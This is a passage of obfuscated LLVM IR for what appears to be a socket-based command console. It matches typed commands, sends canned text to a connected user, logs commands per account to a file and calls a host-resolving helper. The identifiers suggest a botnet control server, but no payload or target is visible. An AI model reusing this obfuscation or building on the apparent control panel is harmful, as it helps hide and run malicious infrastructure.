originalBB62alteredBB:                            ; preds = %originalBB62, %611
  %4262 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4263 = call i8* @strstr(i8* %4262, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0)) #8
  %4264 = icmp ne i8* %4263, null
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %631
  %4265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4266 = call i8* @strstr(i8* %4265, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %4267 = icmp ne i8* %4266, null
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %655
  %4268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %4269 = call i32 (i8*, i8*, ...) @sprintf(i8* %4268, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0)) #7
  %4270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %4271 = call i32 (i8*, i8*, ...) @sprintf(i8* %4270, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4272 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %4273 = call i32 (i8*, i8*, ...) @sprintf(i8* %4272, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i32 0, i32 0)) #7
  %4274 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %4275 = call i32 (i8*, i8*, ...) @sprintf(i8* %4274, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i32 0, i32 0)) #7
  %4276 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %4277 = call i32 (i8*, i8*, ...) @sprintf(i8* %4276, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i32 0, i32 0)) #7
  %4278 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %4279 = call i32 (i8*, i8*, ...) @sprintf(i8* %4278, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i32 0, i32 0)) #7
  %4280 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %4281 = call i32 (i8*, i8*, ...) @sprintf(i8* %4280, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i32 0, i32 0)) #7
  %4282 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %4283 = call i32 (i8*, i8*, ...) @sprintf(i8* %4282, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i32 0, i32 0)) #7
  %4284 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %4285 = call i32 (i8*, i8*, ...) @sprintf(i8* %4284, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i32 0, i32 0)) #7
  %4286 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %4287 = call i32 (i8*, i8*, ...) @sprintf(i8* %4286, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i32 0, i32 0)) #7
  %4288 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %4289 = call i32 (i8*, i8*, ...) @sprintf(i8* %4288, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4290 = load i32, i32* %4, align 4
  %4291 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %4292 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %4293 = call i64 @strlen(i8* %4292) #8
  %4294 = call i64 @send(i32 %4290, i8* %4291, i64 %4293, i32 16384)
  %4295 = icmp eq i64 %4294, -1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %708
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %725
  %4296 = load i32, i32* %4, align 4
  %4297 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %4298 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %4299 = call i64 @strlen(i8* %4298) #8
  %4300 = call i64 @send(i32 %4296, i8* %4297, i64 %4299, i32 16384)
  %4301 = icmp eq i64 %4300, -1
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %764
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %796
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %813
  %4302 = load i32, i32* %4, align 4
  %4303 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %4304 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %4305 = call i64 @strlen(i8* %4304) #8
  %4306 = call i64 @send(i32 %4302, i8* %4303, i64 %4305, i32 16384)
  %4307 = icmp eq i64 %4306, -1
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %844
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %897
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %918
  %4308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4309 = call i8* @strstr(i8* %4308, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0)) #8
  %4310 = icmp ne i8* %4309, null
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %938
  %4311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4312 = call i8* @strstr(i8* %4311, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0)) #8
  %4313 = icmp ne i8* %4312, null
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %962
  %4314 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %4315 = call i32 (i8*, i8*, ...) @sprintf(i8* %4314, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i32 0, i32 0)) #7
  %4316 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %4317 = call i32 (i8*, i8*, ...) @sprintf(i8* %4316, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4318 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %4319 = call i32 (i8*, i8*, ...) @sprintf(i8* %4318, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i32 0, i32 0)) #7
  %4320 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %4321 = call i32 (i8*, i8*, ...) @sprintf(i8* %4320, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i32 0, i32 0)) #7
  %4322 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %4323 = call i32 (i8*, i8*, ...) @sprintf(i8* %4322, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i32 0, i32 0)) #7
  %4324 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %4325 = call i32 (i8*, i8*, ...) @sprintf(i8* %4324, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i32 0, i32 0)) #7
  %4326 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %4327 = call i32 (i8*, i8*, ...) @sprintf(i8* %4326, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4328 = load i32, i32* %4, align 4
  %4329 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %4330 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %4331 = call i64 @strlen(i8* %4330) #8
  %4332 = call i64 @send(i32 %4328, i8* %4329, i64 %4331, i32 16384)
  %4333 = icmp eq i64 %4332, -1
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1007
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1055
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1072
  %4334 = load i32, i32* %4, align 4
  %4335 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %4336 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %4337 = call i64 @strlen(i8* %4336) #8
  %4338 = call i64 @send(i32 %4334, i8* %4335, i64 %4337, i32 16384)
  %4339 = icmp eq i64 %4338, -1
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1095
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1112
  %4340 = load i8*, i8** %3, align 8
  %4341 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %4340) #7
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1147
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1207
  %4342 = load i32, i32* %4, align 4
  %4343 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %4344 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %4345 = call i64 @strlen(i8* %4344) #8
  %4346 = call i64 @send(i32 %4342, i8* %4343, i64 %4345, i32 16384)
  %4347 = icmp eq i64 %4346, -1
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1231
  %4348 = load i32, i32* %4, align 4
  %4349 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %4350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %4351 = call i64 @strlen(i8* %4350) #8
  %4352 = call i64 @send(i32 %4348, i8* %4349, i64 %4351, i32 16384)
  %4353 = icmp eq i64 %4352, -1
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1263
  %4354 = load i32, i32* %4, align 4
  %4355 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %4356 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %4357 = call i64 @strlen(i8* %4356) #8
  %4358 = call i64 @send(i32 %4354, i8* %4355, i64 %4357, i32 16384)
  %4359 = icmp eq i64 %4358, -1
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1286
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1318
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1362
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1396
  %4360 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %4361 = call i32 (i8*, i8*, ...) @sprintf(i8* %4360, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i32 0, i32 0)) #7
  %4362 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %4363 = call i32 (i8*, i8*, ...) @sprintf(i8* %4362, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4364 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %4365 = call i32 (i8*, i8*, ...) @sprintf(i8* %4364, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i32 0, i32 0)) #7
  %4366 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %4367 = call i32 (i8*, i8*, ...) @sprintf(i8* %4366, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i32 0, i32 0)) #7
  %4368 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %4369 = call i32 (i8*, i8*, ...) @sprintf(i8* %4368, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i32 0, i32 0)) #7
  %4370 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %4371 = call i32 (i8*, i8*, ...) @sprintf(i8* %4370, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i32 0, i32 0)) #7
  %4372 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %4373 = call i32 (i8*, i8*, ...) @sprintf(i8* %4372, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i32 0, i32 0)) #7
  %4374 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %4375 = call i32 (i8*, i8*, ...) @sprintf(i8* %4374, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i32 0, i32 0)) #7
  %4376 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %4377 = call i32 (i8*, i8*, ...) @sprintf(i8* %4376, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i32 0, i32 0)) #7
  %4378 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %4379 = call i32 (i8*, i8*, ...) @sprintf(i8* %4378, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i32 0, i32 0)) #7
  %4380 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %4381 = call i32 (i8*, i8*, ...) @sprintf(i8* %4380, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i32 0, i32 0)) #7
  %4382 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %4383 = call i32 (i8*, i8*, ...) @sprintf(i8* %4382, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %4384 = load i32, i32* %4, align 4
  %4385 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %4386 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %4387 = call i64 @strlen(i8* %4386) #8
  %4388 = call i64 @send(i32 %4384, i8* %4385, i64 %4387, i32 16384)
  %4389 = icmp eq i64 %4388, -1
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1443
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1476
  %4390 = load i32, i32* %4, align 4
  %4391 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %4392 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %4393 = call i64 @strlen(i8* %4392) #8
  %4394 = call i64 @send(i32 %4390, i8* %4391, i64 %4393, i32 16384)
  %4395 = icmp eq i64 %4394, -1
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1499
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1523
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1540
  %4396 = load i32, i32* %4, align 4
  %4397 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %4398 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %4399 = call i64 @strlen(i8* %4398) #8
  %4400 = call i64 @send(i32 %4396, i8* %4397, i64 %4399, i32 16384)
  %4401 = icmp eq i64 %4400, -1
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1579
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1612
  %4402 = load i32, i32* %4, align 4
  %4403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %4404 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %4405 = call i64 @strlen(i8* %4404) #8
  %4406 = call i64 @send(i32 %4402, i8* %4403, i64 %4405, i32 16384)
  %4407 = icmp eq i64 %4406, -1
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1635
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1652
  %4408 = load i32, i32* %4, align 4
  %4409 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %4410 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %4411 = call i64 @strlen(i8* %4410) #8
  %4412 = call i64 @send(i32 %4408, i8* %4409, i64 %4411, i32 16384)
  %4413 = icmp eq i64 %4412, -1
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1705
  %4414 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4415 = call i8* @strstr(i8* %4414, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i32 0, i32 0)) #8
  %4416 = icmp ne i8* %4415, null
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1725
  %4417 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4418 = call i8* @strstr(i8* %4417, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0)) #8
  %4419 = icmp ne i8* %4418, null
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1745
  %4420 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4421 = call i8* @strstr(i8* %4420, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0)) #8
  %4422 = icmp ne i8* %4421, null
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1792
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1832
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1870
  %4423 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4424 = call i8* @strstr(i8* %4423, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0)) #8
  %4425 = icmp ne i8* %4424, null
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1890
  %4426 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4427 = call i8* @strstr(i8* %4426, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0)) #8
  %4428 = icmp ne i8* %4427, null
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1910
  %4429 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4430 = call i8* @strstr(i8* %4429, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0)) #8
  %4431 = icmp ne i8* %4430, null
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1986
  %4432 = load i32, i32* %4, align 4
  %4433 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %4434 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %4435 = call i64 @strlen(i8* %4434) #8
  %4436 = call i64 @send(i32 %4432, i8* %4433, i64 %4435, i32 16384)
  %4437 = icmp eq i64 %4436, -1
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %2009
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %2041
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %2058
  %4438 = load i32, i32* %4, align 4
  %4439 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %4440 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %4441 = call i64 @strlen(i8* %4440) #8
  %4442 = call i64 @send(i32 %4438, i8* %4439, i64 %4441, i32 16384)
  %4443 = icmp eq i64 %4442, -1
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %2081
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %2105
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %2122
  %4444 = load i32, i32* %4, align 4
  %4445 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %4446 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %4447 = call i64 @strlen(i8* %4446) #8
  %4448 = call i64 @send(i32 %4444, i8* %4445, i64 %4447, i32 16384)
  %4449 = icmp eq i64 %4448, -1
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2145
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2185
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2210
  %4450 = load i32, i32* %4, align 4
  %4451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %4452 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %4453 = call i64 @strlen(i8* %4452) #8
  %4454 = call i64 @send(i32 %4450, i8* %4451, i64 %4453, i32 16384)
  %4455 = icmp eq i64 %4454, -1
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2233
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2258
  %4456 = load i32, i32* %4, align 4
  %4457 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %4458 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %4459 = call i64 @strlen(i8* %4458) #8
  %4460 = call i64 @send(i32 %4456, i8* %4457, i64 %4459, i32 16384)
  %4461 = icmp eq i64 %4460, -1
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2290
  %4462 = load i32, i32* %4, align 4
  %4463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %4464 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %4465 = call i64 @strlen(i8* %4464) #8
  %4466 = call i64 @send(i32 %4462, i8* %4463, i64 %4465, i32 16384)
  %4467 = icmp eq i64 %4466, -1
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2313
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2337
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2401
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2439
  %4468 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4469 = call i8* @strstr(i8* %4468, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #8
  %4470 = icmp ne i8* %4469, null
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2500
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2517
  %4471 = load i32, i32* %4, align 4
  %4472 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %4473 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %4474 = call i64 @strlen(i8* %4473) #8
  %4475 = call i64 @send(i32 %4471, i8* %4472, i64 %4474, i32 16384)
  %4476 = icmp eq i64 %4475, -1
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2557
  %4477 = load i32, i32* %4, align 4
  %4478 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %4479 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %4480 = call i64 @strlen(i8* %4479) #8
  %4481 = call i64 @send(i32 %4477, i8* %4478, i64 %4480, i32 16384)
  %4482 = icmp eq i64 %4481, -1
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2604
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2621
  %4483 = load i8*, i8** %3, align 8
  %4484 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %4483) #7
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2662
  %4485 = load i32, i32* %5, align 4
  %4486 = sext i32 %4485 to i64
  %4487 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4486
  %4488 = getelementptr inbounds %struct.account, %struct.account* %4487, i32 0, i32 0
  %4489 = getelementptr inbounds [20 x i8], [20 x i8]* %4488, i32 0, i32 0
  %4490 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4491 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %4489, i8* %4490)
  %4492 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %4492, %struct._IO_FILE** %98, align 8
  %4493 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %4494 = load i32, i32* %5, align 4
  %4495 = sext i32 %4494 to i64
  %4496 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %4495
  %4497 = getelementptr inbounds %struct.account, %struct.account* %4496, i32 0, i32 0
  %4498 = getelementptr inbounds [20 x i8], [20 x i8]* %4497, i32 0, i32 0
  %4499 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4500 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %4493, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %4498, i8* %4499)
  %4501 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %4502 = call i32 @fclose(%struct._IO_FILE* %4501)
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2697
  %4503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4504 = call i8* @strstr(i8* %4503, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #8
  %4505 = icmp ne i8* %4504, null
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2771
  %4506 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4507 = call i32 (i8*, i8*, ...) @sprintf(i8* %4506, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i32 0, i32 0)) #7
  %4508 = load i32, i32* %4, align 4
  %4509 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4511 = call i64 @strlen(i8* %4510) #8
  %4512 = call i64 @send(i32 %4508, i8* %4509, i64 %4511, i32 16384)
  %4513 = icmp eq i64 %4512, -1
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2797
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2818
  %4514 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4515 = call i32 (i8*, i8*, ...) @sprintf(i8* %4514, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i32 0, i32 0)) #7
  %4516 = load i32, i32* %4, align 4
  %4517 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4518 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4519 = call i64 @strlen(i8* %4518) #8
  %4520 = call i64 @send(i32 %4516, i8* %4517, i64 %4519, i32 16384)
  %4521 = icmp eq i64 %4520, -1
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2843
  store i8* null, i8** %2, align 8
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2874
  store i8* null, i8** %2, align 8
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2892
  %4522 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4523 = call i8* @strstr(i8* %4522, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0)) #8
  %4524 = icmp ne i8* %4523, null
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2925
  %4525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %4526 = call i8* @strtok(i8* %4525, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %4526, i8** %102, align 8
  %4527 = load i8*, i8** %102, align 8
  %4528 = getelementptr inbounds i8, i8* %4527, i64 8
  store i8* %4528, i8** %103, align 8
  %4529 = load i8*, i8** %103, align 8
  call void @trim(i8* %4529)
  %4530 = load i8*, i8** %103, align 8
  %4531 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %4532 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %4530, i8** %4531)
  %4533 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %4534 = load i8*, i8** %103, align 8
  %4535 = getelementptr inbounds [100 x i8*], [100 x i8*]* %101, i32 0, i32 0
  %4536 = call i32 (i8*, i8*, ...) @sprintf(i8* %4533, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i32 0, i32 0), i8* %4534, i8** %4535) #7
  %4537 = load i32, i32* %4, align 4
  %4538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
